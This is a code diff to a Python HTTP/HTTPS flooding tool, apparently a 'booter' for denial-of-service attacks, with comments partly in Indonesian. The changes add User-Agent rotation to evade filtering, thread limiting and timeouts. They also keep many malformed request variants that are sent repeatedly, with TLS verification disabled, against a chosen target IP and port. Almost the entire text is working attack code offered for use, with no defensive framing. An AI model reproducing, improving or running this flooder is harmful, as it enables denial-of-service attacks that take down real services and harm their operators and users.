@@ -11,6 +11,17 @@ import ssl
 from colorama import Fore
 
 stop_attack = threading.Event()
+MAX_THREADS = 100  # Batas thread aktif untuk mencegah crash
+
+# Daftar User-Agent untuk rotasi
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+]
+
+# Semaphore untuk mengontrol jumlah thread
+thread_semaphore = threading.Semaphore(MAX_THREADS)
 
 # Clear screen
 def clear_text():
@@ -25,73 +36,76 @@ def generate_url_path_choice(num):
     letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     return ''.join(random.choice(letter) for _ in range(int(num)))
 
-# Attack logic with HTTP/HTTPS support
+# Attack logic with improved error handling
 def DoS_Attack(ip, host, port, protocol, type_attack, booter_sent, data_type_loader_packet):
     if stop_attack.is_set():
         return
     
-    path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
-    path_get_loader = random.choice(path_get)
-    if path_get_loader == "PY_FLOOD":
-        url_path = generate_url_path_pyflooder(5)
-    else:
-        url_path = generate_url_path_choice(5)
-    
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    # Wrap socket with SSL for HTTPS
-    if protocol.lower() == "https":
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        context.check_hostname = False  # Disable hostname verification for testing
-        context.verify_mode = ssl.CERT_NONE  # Disable certificate verification for testing
-        s = context.wrap_socket(s, server_hostname=host)
-    
-    try:
-        # Payload variations
-        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n".encode()
-        elif data_type_loader_packet == 'OWN1':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n\r\r".encode()
-        elif data_type_loader_packet == 'OWN2':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\r\r\n\n".encode()
-        elif data_type_loader_packet == 'OWN3':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN4':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n\n\n".encode()
-        elif data_type_loader_packet == 'OWN5':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n\n\n\r\r\r\r".encode()
-        elif data_type_loader_packet == 'OWN6':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\r\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN7':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\r\n\r".encode()
-        elif data_type_loader_packet == 'OWN8':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\r\n\r".encode()
-        elif data_type_loader_packet == 'TEST':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\r\n\r\n\n".encode()
-        elif data_type_loader_packet == 'TEST2':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
-        elif data_type_loader_packet == 'TEST3':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\a\n\r\n\n".encode()
-        elif data_type_loader_packet == 'TEST4':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\a\n\a\n\n\r\r".encode()
-        elif data_type_loader_packet == 'TEST5':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\t\n\n\r\r".encode()
-            
-        s.connect((ip, port))
-        for _ in range(booter_sent):
-            if stop_attack.is_set():
-                break
-            s.sendall(packet_data)
-            s.send(packet_data)  # Double send for intensity
-        print(f"{Fore.GREEN}Sent packet to {ip}:{port} ({protocol}) with payload {data_type_loader_packet}{Fore.RESET}")
-    except Exception as e:
-        print(f"{Fore.RED}Error in attack: {e}{Fore.RESET}")
-    finally:
+    with thread_semaphore:  # Kontrol jumlah thread aktif
+        path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
+        path_get_loader = random.choice(path_get)
+        if path_get_loader == "PY_FLOOD":
+            url_path = generate_url_path_pyflooder(5)
+        else:
+            url_path = generate_url_path_choice(5)
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)  # Timeout untuk koneksi
+        
+        # Wrap socket with SSL for HTTPS
+        if protocol.lower() == "https":
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            s = context.wrap_socket(s, server_hostname=host)
+        
         try:
-            s.shutdown(socket.SHUT_RDWR)
-            s.close()
-        except:
-            pass
+            user_agent = random.choice(USER_AGENTS)
+            # Payload variations
+            if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\n".encode()
+            elif data_type_loader_packet == 'OWN1':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\n\r\r".encode()
+            elif data_type_loader_packet == 'OWN2':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\r\r\n\n".encode()
+            elif data_type_loader_packet == 'OWN3':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\r\n".encode()
+            elif data_type_loader_packet == 'OWN4':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\n\n\n".encode()
+            elif data_type_loader_packet == 'OWN5':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\n\n\n\r\r\r\r".encode()
+            elif data_type_loader_packet == 'OWN6':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\r\n\r\n".encode()
+            elif data_type_loader_packet == 'OWN7':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\r\n\r".encode()
+            elif data_type_loader_packet == 'OWN8':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\b\n\b\n\r\n\r".encode()
+            elif data_type_loader_packet == 'TEST':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\b\n\b\n\r\n\r\n\n".encode()
+            elif data_type_loader_packet == 'TEST2':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
+            elif data_type_loader_packet == 'TEST3':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\b\n\b\n\a\n\r\n\n".encode()
+            elif data_type_loader_packet == 'TEST4':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
+            elif data_type_loader_packet == 'TEST5':
+                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\b\n\t\n\n\r\r".encode()
+            
+            s.connect((ip, port))
+            for _ in range(booter_sent):
+                if stop_attack.is_set():
+                    break
+                s.sendall(packet_data)
+                s.send(packet_data)  # Double send
+            print(f"{Fore.GREEN}Sent packet to {ip}:{port} ({protocol}) with payload {data_type_loader_packet}{Fore.RESET}")
+        except Exception as e:
+            print(f"{Fore.RED}Error in attack: {e}{Fore.RESET}")
+        finally:
+            try:
+                s.shutdown(socket.SHUT_RDWR)
+                s.close()
+            except:
+                pass
 
 def runing_attack(ip, host, port, protocol, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
     while time.time() < time_loader and not stop_attack.is_set():
@@ -105,7 +119,7 @@ def runing_attack(ip, host, port, protocol, time_loader, spam_loader, methods_lo
 def countdown_timer(time_loader):
     remaining = int(time_loader - time.time())
     while remaining > 0 and not stop_attack.is_set():
-        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
+        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds, Active threads: {threading.active_count()}{Fore.RESET}")
         sys.stdout.flush()
 
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
@@ -165,7 +179,7 @@ def command():
                         continue
 
                     stop_attack.clear()
-                    print(f"{Fore.LIGHTCYAN_EX}Attack Started\n{Fore.YELLOW}Protocol: {protocol}\nTarget: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")
+                    print(f"{Fore.LIGHTCYAN_EX}Attack Started\n{Fore.YELLOW}Protocol: {protocol}\nTarget: {target_loader}\nIP: {ip}\nPort: {port_loader}\nType: {data_type_loader_packet}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}{Fore.RESET}")
 
                     for loader_num in range(create_thread):
                         sys.stdout.write(f"\r{Fore.YELLOW}{loader_num} OF {create_thread} CREATE THREAD . . .{Fore.RESET}")
